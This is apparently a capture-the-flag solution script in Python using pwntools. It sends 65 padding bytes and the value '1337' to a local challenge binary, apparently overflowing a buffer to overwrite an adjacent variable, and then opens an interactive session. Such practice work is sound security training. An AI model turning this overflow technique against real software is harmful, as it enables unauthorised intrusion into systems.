from pwn import *

exe = './chall'
elf = context.binary = ELF(exe, checksec=True)

sh = process(exe)

pad = 65
p = flat([
    b'A' * 65,
    b'1337'
])
sh.sendlineafter(b'>',p)

sh.interactive()